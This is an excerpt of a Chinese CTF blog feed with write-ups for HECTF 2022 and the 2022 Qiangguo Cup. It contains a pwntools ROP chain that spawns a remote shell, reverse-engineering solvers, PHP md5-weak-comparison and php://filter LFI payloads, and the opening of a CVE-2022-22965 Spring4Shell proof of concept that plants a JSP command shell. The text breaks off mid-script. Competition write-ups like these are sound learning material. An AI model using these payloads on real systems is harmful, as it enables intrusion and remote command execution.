class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>rdi=<span class="hljs-number">0x00000000004018b2</span><br>rsi=<span class="hljs-number">0x000000000040661e</span><br>rdx=<span class="hljs-number">0x00000000004017bf</span><br>ret=<span class="hljs-number">0x000000000040f408</span><br>syscall=<span class="hljs-number">0x00000000004012e3</span><br>rax=<span class="hljs-number">0x0000000000451aa7</span><br>read=<span class="hljs-number">0x450ff0</span><br><br><span class="hljs-comment">#p=remote()</span><br><span class="hljs-comment">#p=process(&#x27;./static&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p,&#x27;bp 0x401e3c&#x27;)</span><br><span class="hljs-comment">#pause()</span><br>p=remote(<span class="hljs-string">&#x27;121.4.119.164&#x27;</span>,<span class="hljs-string">&#x27;32430&#x27;</span>)<br>e=ELF(<span class="hljs-string">&#x27;./static&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x29</span>)<br>payload=flat(<br>        rdi,<span class="hljs-number">0</span>,<br>        rsi,e.bss(<span class="hljs-number">0x100</span>),<br>        rdx,<span class="hljs-number">0x20</span>,<br>        read,<br>        rdi,e.bss(<span class="hljs-number">0x100</span>),<br>        rsi,<span class="hljs-number">0</span>,<br>        rdx,<span class="hljs-number">0</span>,<br>        ret,<br>        rax,<span class="hljs-number">0x3b</span>,<br>        syscall);<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">8</span>+payload)<br><br>p.interactive()<br><span class="hljs-comment">#for i in range(8):</span><br><span class="hljs-comment">#    p.sendline(&#x27;+&#x27;)</span><br><span class="hljs-comment">#for i in range(8):</span><br><span class="hljs-comment">#    p.sendline(&#x27;+&#x27;)</span><br><br>p.sendline(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/pwn3-3.png"></p><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="apk"><a href="#apk" class="headerlink" title="apk"></a>apk</h2><p><em>赛后复现</em></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse5-1.png"></p><h2 id="贝斯"><a href="#贝斯" class="headerlink" title="贝斯"></a>贝斯</h2><p>输入的数据经过某种加密后对每个字节取反，然后与<code>P0w3r</code>的内容比较<br>在<code>Enc0de</code>中看字符集发现是base32加密</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse1-1.png"></p><p>将<code>P0w3r</code>变量的内容提取出来后异或<code>0xff</code>，base32解码即可</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>a=[<span class="hljs-number">0xB5</span>,<span class="hljs-number">0xBD</span>,<span class="hljs-number">0xBC</span>,<span class="hljs-number">0xAA</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xA9</span>,<span class="hljs-number">0xBC</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xAF</span>,<span class="hljs-number">0xB1</span>,<span class="hljs-number">0xBA</span>,<span class="hljs-number">0xAA</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xCA</span>,<span class="hljs-number">0xB3</span>,<span class="hljs-number">0xAC</span>,<span class="hljs-number">0xB0</span>,<span class="hljs-number">0xB2</span>,<span class="hljs-number">0xA5</span>,<span class="hljs-number">0xAA</span>,<span class="hljs-number">0xCD</span>,<span class="hljs-number">0xC9</span>,<span class="hljs-number">0xB4</span>,<span class="hljs-number">0xAB</span>,<span class="hljs-number">0xB0</span>,<span class="hljs-number">0xAD</span>,<span class="hljs-number">0xAE</span>,<span class="hljs-number">0xA7</span>,<span class="hljs-number">0xBA</span>,<span class="hljs-number">0xCB</span>,<span class="hljs-number">0xA5</span>,<span class="hljs-number">0xAD</span>,<span class="hljs-number">0xB1</span>,<span class="hljs-number">0xA5</span>,<span class="hljs-number">0xBD</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xAC</span>,<span class="hljs-number">0xCA</span>,<span class="hljs-number">0xBB</span>,<span class="hljs-number">0xAA</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xB1</span>,<span class="hljs-number">0xA5</span>,<span class="hljs-number">0xBA</span>,<span class="hljs-number">0xB0</span>,<span class="hljs-number">0xCB</span>,<span class="hljs-number">0xAB</span>,<span class="hljs-number">0xB5</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xB1</span>,<span class="hljs-number">0xAB</span>,<span class="hljs-number">0xBC</span>,<span class="hljs-number">0xB2</span>,<span class="hljs-number">0xA9</span>,<span class="hljs-number">0xA5</span>,<span class="hljs-number">0xAE</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xB1</span>,<span class="hljs-number">0xC9</span>,<span class="hljs-number">0xAE</span>]<br>e=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    e+=<span class="hljs-built_in">chr</span>(i^<span class="hljs-number">0xff</span>)<br>e+=<span class="hljs-string">&#x27;====&#x27;</span><br><span class="hljs-built_in">print</span>(base64.b32decode(e))<br></code></pre></td></tr></table></figure><h2 id="HelloIos"><a href="#HelloIos" class="headerlink" title="HelloIos"></a>HelloIos</h2><p>一个简单的比较，异或<code>0x1F</code>然后加1</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse2-1.png"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">&#x27;X[]LZeX&#123;ttqAwqmc&#x27;</span><br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    e+=<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">0x1f</span>)+<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><h2 id="author’sB0x"><a href="#author’sB0x" class="headerlink" title="author’sB0x"></a>author’sB0x</h2><p>观察发现<code>init_S</code>,<code>init_Key</code>,<code>permute_S</code>,<code>create_key_stream</code>这几个函数中用到的数据是固定的，用来生成<code>KeyStream</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse3-1.png"></p><p>直接粘贴到编译器运行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> S[<span class="hljs-number">256</span>]=&#123;&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> T[<span class="hljs-number">256</span>]=&#123;&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> Key[]=<span class="hljs-string">&quot;thisiskey&quot;</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> KeyStream[<span class="hljs-number">32</span>]=&#123;&#125;;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *<span class="hljs-title function_">init_S</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">255</span>; ++i )<br>  &#123;<br>    result = S;<br>    S[i] = i;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">init_Key</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">255</span>; ++i )<br>  &#123;<br>    result = T;<br>    T[i] = Key[i % <span class="hljs-number">9</span>];<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *<span class="hljs-title function_">permute_S</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  v3 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">255</span>; ++i )<br>  &#123;<br>    v3 = (S[i] + v3 + (<span class="hljs-type">char</span>)T[i]) % <span class="hljs-number">256</span>;<br>    v1 = S[i];<br>    S[i] = S[v3];<br>    result = S;<br>    S[v3] = v1;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-type">char</span>  <span class="hljs-title function_">create_key_stream</span><span class="hljs-params">(<span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> result; <span class="hljs-comment">// al</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  v5 = <span class="hljs-number">0</span>;<br>  v6 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; KeyStream[v5++] = S[(S[v6] + S[i]) % <span class="hljs-number">256</span>] )<br>  &#123;<br>    v2 = a2--;<br>    result = v2 != <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( !result )<br>      <span class="hljs-keyword">break</span>;<br>    i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>    v6 = (v6 + S[i]) % <span class="hljs-number">256</span>;<br>    v4 = S[i];<br>    S[i] = S[v6];<br>    S[v6] = v4;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>   init_S();<br>  init_Key();<br>  permute_S();<br>  create_key_stream(<span class="hljs-number">32</span>);<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">32</span>;i++)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,KeyStream[i]);<br>  &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>运行后得到<code>[139,176,166,182,170,108,177,66,249,64,195,137,150,140,2,41,86,253,212,116,98,236,64,117,90,37,237,197,126,172,174,59]</code>，这个就是<code>KeyStream</code>的值</p><p><code>KeyStream</code>的值与<code>Cry</code>的值异或，得到flag</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0xC3</span>,<span class="hljs-number">0xF5</span>,<span class="hljs-number">0xE5</span>,<span class="hljs-number">0xE2</span>,<span class="hljs-number">0xEC</span>,<span class="hljs-number">0x17</span>,<span class="hljs-number">0xE5</span>,<span class="hljs-number">0x2A</span>,<span class="hljs-number">0xCA</span>,<span class="hljs-number">0x3</span>,<span class="hljs-number">0xB6</span>,<span class="hljs-number">0xFD</span>,<span class="hljs-number">0xC1</span>,<span class="hljs-number">0xBC</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0xCD</span>,<span class="hljs-number">0xA6</span>,<span class="hljs-number">0x13</span>,<span class="hljs-number">0x0B</span>,<span class="hljs-number">0x9A</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0x0E</span>,<span class="hljs-number">0x4D</span>,<span class="hljs-number">0xDE</span>,<span class="hljs-number">0x95</span>,<span class="hljs-number">0x12</span>,<span class="hljs-number">0x9C</span>,<span class="hljs-number">0xD9</span>,<span class="hljs-number">0x46</span>]<br>b=[<span class="hljs-number">139</span>,<span class="hljs-number">176</span>,<span class="hljs-number">166</span>,<span class="hljs-number">182</span>,<span class="hljs-number">170</span>,<span class="hljs-number">108</span>,<span class="hljs-number">177</span>,<span class="hljs-number">66</span>,<span class="hljs-number">249</span>,<span class="hljs-number">64</span>,<span class="hljs-number">195</span>,<span class="hljs-number">137</span>,<span class="hljs-number">150</span>,<span class="hljs-number">140</span>,<span class="hljs-number">2</span>,<span class="hljs-number">41</span>,<span class="hljs-number">86</span>,<span class="hljs-number">253</span>,<span class="hljs-number">212</span>,<span class="hljs-number">116</span>,<span class="hljs-number">98</span>,<span class="hljs-number">236</span>,<span class="hljs-number">64</span>,<span class="hljs-number">117</span>,<span class="hljs-number">90</span>,<span class="hljs-number">37</span>,<span class="hljs-number">237</span>,<span class="hljs-number">197</span>,<span class="hljs-number">126</span>,<span class="hljs-number">172</span>,<span class="hljs-number">174</span>,<span class="hljs-number">59</span>]<br>e=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(a):<br>    e+=<span class="hljs-built_in">chr</span>(v^b[i])<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><h2 id="勇士斗恶龙"><a href="#勇士斗恶龙" class="headerlink" title="勇士斗恶龙"></a>勇士斗恶龙</h2><p>在ida中通过搜索字符串跳转到程序主要函数，得到函数对于程序的偏移地址<code>38B0</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse4-1.png"></p><p>x64dbg动态调试程序，在主要函数设置断点</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse4-2.png"></p><p>当程序中断时，rcx的值是<code>00000170E3A824B0</code>，储存了两个指针，指向了勇士和恶龙的对象</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse4-3.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse4-4.png"></p><p><code>0x170e3a828e0+0x20</code>地址处储存了勇士的金币数，将其修改为<code>0xffff</code>,购买高级的装备，将内存地址转移到<code>0x170e3a82950+0x20</code>指向的地址处，输入<code>a</code>攻击恶龙，观察内存数据变化,当恶龙血量为<code>520</code>时得到<code>flag</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse4-5.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Rank: 13&lt;/p&gt;
&lt;h1 id=&quot;misc&quot;&gt;&lt;a href=&quot;#misc&quot; class=&quot;headerlink&quot; title=&quot;misc&quot;&gt;&lt;/a&gt;misc&lt;/h1&gt;&lt;h2 id=&quot;咦-小鲨鱼来喽&quot;&gt;&lt;a href=&quot;#咦-小鲨鱼来喽&quot; class=&quot;header</summary>
      
    
    
    
    <category term="wp" scheme="https://www.lewiserii.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.lewiserii.top/tags/wp/"/>
    
    <category term="HECTF" scheme="https://www.lewiserii.top/tags/HECTF/"/>
    
  </entry>
  
  <entry>
    <title>2022强国杯技术技能大赛东部晋级赛wp</title>
    <link href="https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/2022%E5%BC%BA%E5%9B%BD%E6%9D%AF%E6%8A%80%E6%9C%AF%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E4%B8%9C%E9%83%A8%E6%99%8B%E7%BA%A7%E8%B5%9Bwp.html"/>
    <id>https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/2022%E5%BC%BA%E5%9B%BD%E6%9D%AF%E6%8A%80%E6%9C%AF%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E4%B8%9C%E9%83%A8%E6%99%8B%E7%BA%A7%E8%B5%9Bwp.html</id>
    <published>2022-10-17T10:00:00.000Z</published>
    <updated>2022-10-24T13:08:31.623Z</updated>
    
    <content type="html"><![CDATA[<p>Rank：13，被打爆了</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="md5-php"><a href="#md5-php" class="headerlink" title="md5_php"></a>md5_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><br><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>]))&#123;<br>   <span class="hljs-variable">$md5</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br>   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$md5</span>==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$md5</span>))<br>       <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&#x27;le.php&#x27;</span>);<br>   <span class="hljs-keyword">else</span><br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;快了解MD5&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;MMMMDDDD5555&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>md5弱比较，找一个加密前后都是0e开头的值</p><p>传入<code>?md5=0e215962017</code></p><p>拿到<code>le.php</code>的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))<br>&#123;<br>    <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;good&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;luck&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;index&quot;</span>))&#123;<br>        <span class="hljs-keyword">include</span> (<span class="hljs-variable">$file</span> . <span class="hljs-string">&#x27;.php&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry, we currently only support flag and luck.&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>传入的值中要包含<code>good</code>，<code>luck</code>或者<code>index</code></p><p>用伪协议读内容，用<code>index/../flag</code>绕过判断</p><p>最后传入<code>?file=php://filter/convert.base64-encode/resource=index/../flag</code>拿到flag</p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>通过报错页面得知是<code>spring</code></p><p><code>github</code>搜最新的<code>spring rce</code></p><p>通过<code>CVE-2022-22965</code>的<code>POC</code>getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Author: @Rezn0k</span><br><span class="hljs-comment"># Based off the work of p1n93r</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># Set to bypass errors if the target site has SSL issues</span><br>requests.packages.urllib3.disable_warnings()<br><br>post_headers = &#123;<br>    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span><br>&#125;<br><br>get_headers = &#123;<br>    <span class="hljs-string">&quot;prefix&quot;</span>: <span class="hljs-string">&quot;&lt;%&quot;</span>,<br>    <span class="hljs-string">&quot;suffix&quot;</span>: <span class="hljs-string">&quot;%&gt;//&quot;</span>,<br>    <span class="hljs-comment"># This may seem strange, but this seems to be needed to bypass some check that looks for &quot;Runtime&quot; in the log_pattern</span><br>    <span class="hljs-string">&quot;c&quot;</span>: <span class="hljs-string">&quot;Runtime&quot;</span>,<br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_exploit</span>(<span class="hljs-params">url, directory, filename</span>):<br>    log_pattern = <span class="hljs-string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20&quot;</span> \<br>                  <span class="hljs-string">f&quot;java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter&quot;</span> \<br>                  <span class="hljs-string">f&quot;(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B&quot;</span> \<br>                  <span class="hljs-string">f&quot;%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&quot;</span><br><br>    log_file_suffix = <span class="hljs-string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&quot;</span><br>    log_file_dir = <span class="hljs-string">f&quot;class.module.classLoader.resources.context.parent.pipeline.first.directory=<span class="hljs-subst">&#123;directory&#125;</span>&quot;</span><br>    log_file_prefix = <span class="hljs-string">f&quot;class.module.classLoader.resources.context.parent.pipeline.first.prefix=<span class="hljs-subst">&#123;filename&#125;</span>&quot;</span><br>    log_file_date_format = <span class="hljs-string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&quot;</span><br><br>    exp_data = <span class="hljs-string">&quot;&amp;&quot;</span>.join([log_pattern, log_file_suffix, log_file_dir, log_file_prefix, log_file_date_format])<br><br>    <span class="hljs-comment"># Setting and unsetting the fileDateFormat field allows for executing the exploit multiple times</span><br>    <span class="hljs-comment"># If re-running the exploit, this 